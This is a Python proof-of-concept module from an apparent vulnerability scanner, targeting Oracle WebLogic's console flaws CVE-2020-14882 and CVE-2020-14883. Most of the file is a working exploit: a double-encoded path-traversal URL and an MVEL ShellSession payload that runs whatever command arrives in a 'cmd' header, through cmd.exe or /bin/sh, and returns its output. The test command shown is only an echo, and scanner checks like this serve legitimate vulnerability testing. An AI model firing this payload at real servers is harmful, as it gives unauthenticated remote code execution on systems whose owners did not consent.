# coding : utf-8
# @Time : 2022/10/24 9:44
# @Author : hqe
# @File : v_2022_0005_WLS_RCE.py
# @Project : GEngine
from BasePoc import BasePoc
from lib.ReqUtils import req
import http.client
http.client.HTTPConnection._http_vsn_str = 'HTTP/1.0'

POC_NAME="WeblogicRCE"

class WeblogicRCE(BasePoc):

    poc_info = {
            'Id': 'v_2022_0005',
            'Name': 'Oracle WebLogic Server 安全漏洞',
            'Author': 'hqe',
            'Create_date': '2022-10-24',
    }

    vul_info = {
        'Product': 'Oracle',
        'Version': '10.3.6.0.0版本, 12.1.3.0.0版本, 12.2.1.3.0版本, 12.2.1.4.0版本, 14.1.1.0.0版本。',
        'Type': '代码执行',
        'Level': 4,
        'CVE': 'CVE-2020-14882,CVE-2020-14883',
        'CNNVD': 'CNNVD-202010-1008,CNNVD-202010-997',
        'CNVD': 'CNVD-2020-59715,CNVD-2020-70267',
        'Description': """
                            Oracle WebLogic Server是美国甲骨文（Oracle）公司的一款适用于云环境和传统环境的应用服务中间件，它提供了一个现代轻型开发平台，支持应用从开发到生产的整个生命周期管理，并简化了应用的部署和管理。
                             远程攻击者可以通过发送恶意的HTTP请求。成功利用此漏洞的攻击者可在未经身份验证的情况下控制 WebLogic Server Console ，并执行任意代码。
                       """,
        'DisclosureDate': '2020-06-19',
    }

    def verify(self,  *args, **kwargs):
        # port = '7001'
        port = '14877'
        payload = ('_nfpb=true&_pageLabel=&handle='
                                      'com.tangosol.coherence.mvel2.sh.ShellSession("weblogic.work.ExecuteThread executeThread = '
                                      '(weblogic.work.ExecuteThread) Thread.currentThread(); weblogic.work.WorkAdapter adapter = '
                                      'executeThread.getCurrentWork(); java.lang.reflect.Field field = adapter.getClass().getDeclaredField'
                                      '("connectionHandler"); field.setAccessible(true); Object obj = field.get(adapter); weblogic.servlet'
                                      '.internal.ServletRequestImpl req = (weblogic.servlet.internal.ServletRequestImpl) '
                                      'obj.getClass().getMethod("getServletRequest").invoke(obj); String cmd = req.getHeader("cmd"); '
                                      'String[] cmds = System.getProperty("os.name").toLowerCase().contains("window") ? new String[]'
                                      '{"cmd.exe", "/c", cmd} : new String[]{"/bin/sh", "-c", cmd}; if (cmd != null) { String result '
                                      '= new java.util.Scanner(java.lang.Runtime.getRuntime().exec(cmds).getInputStream()).useDelimiter'
                                      '("\\\\A").next(); weblogic.servlet.internal.ServletResponseImpl res = (weblogic.servlet.internal.'
                                      'ServletResponseImpl) req.getClass().getMethod("getResponse").invoke(req);'
                                      'res.getServletOutputStream().writeStream(new weblogic.xml.util.StringInputStream(result));'
                                      'res.getServletOutputStream().flush(); res.getWriter().write(""); }executeThread.interrupt(); ");')

        path = "/console/css/%252e%252e%252fconsole.portal"
        headers = {
            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,'
                      'application/signed-exchange;v=b3;q=0.9',
            'Accept-Encoding': 'gzip, deflate',
            'Accept-Language': 'zh-CN,zh;q=0.9',
            'Connection': 'close',
            'Content-Type': 'application/x-www-form-urlencoded',
            'cmd': 'echo goldencis'
        }
        res = req(url = 'http://' + self.scan_info['Target'] + ':' + port + path, method = 'post',data=payload, headers=headers)
        if 'goldencis' in res.text:
            self.scan_info['Success'] = True
